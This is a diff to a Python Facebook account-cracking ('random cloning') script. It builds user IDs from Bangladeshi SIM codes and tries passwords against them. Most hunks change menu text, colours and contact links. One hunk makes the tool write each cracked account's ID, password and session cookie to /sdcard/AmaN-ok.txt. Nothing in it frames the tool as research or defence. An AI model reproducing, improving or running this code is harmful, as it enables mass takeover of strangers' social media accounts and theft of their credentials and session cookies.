@@ -208,10 +208,10 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print("[\033[1;37m01]\33[1;92mSTART RANDOM CLONING")
-	print("[\033[1;37m02]\33[1;92mCONTACT ME ON FACEBOOK")
-	print("[\033[1;37m03]\33[1;92mFOLLOW ME ON GITHUB")
-	print('[\033[1;37m00]\33[1;92mEXIT PROGRAMMING')
+	print("[\033[1;37m01\33[1;92m]START RANDOM CLONING")
+	print("[\033[1;37m02\33[1;92m]CONTACT WITH ADMIN")
+	print("[\033[1;37m03\33[1;92m]FOLLOW ME ON GITHUB")
+	print('[\033[1;37m00\33[1;92m]EXIT PROGRAMMING')
 	print(54*'━')
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
@@ -220,7 +220,7 @@ def Main():
 		admin()
 	if opt in ["C","3"]:
 		os.system('xdg-open https://github.com/5UP3R1');time.sleep(1)
-		fb()
+		Main()
 	if opt in ["0","0"]:
 		exit()
 		
@@ -231,14 +231,18 @@ def admin():
 	os.system('clear')
 	print(logo)
 	print(50*'_')
-	print(' [1] Contract Facebook ')
-	print(' [2] FOLLOW MY GITHUB ')
+	print(' [1] CONTACT ME ON Facebook ')
+	print(' [2] FOLLOW MY PAGE' )
+	print(' [3] FOLLOW MY GITHUB ')
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://m.facebook.com/sorry134');time.sleep(1)
+		os.system('xdg-open https://m.facebook.com/sorry1314');time.sleep(1)
 		admin()
 	if bal =='2':
+	    os.system('xdg-open https://m.facebook.com/killer1314');time.sleep(1)
+	    admin()
+	if bal =='3':
 		os.system('xdg-open https://github.com/5UP3R1');time.sleep(1)
 		admin()
 	if bal =='0':
@@ -265,7 +269,7 @@ def virusA():
 		print('┏━[•] COUNTRY    : Bangladesh')
 		print('┣━[•] TOTAL ID   :  '+tl)
 		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
-		print('\033[1;97m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
+		print('\033[1;92m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -328,7 +332,7 @@ def b(uid,pwx,tl):
                 print(f'\r\33[1;92m [AmaN-OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/AmaN-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/AmaN-ok.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                 break
             else:
                 continue
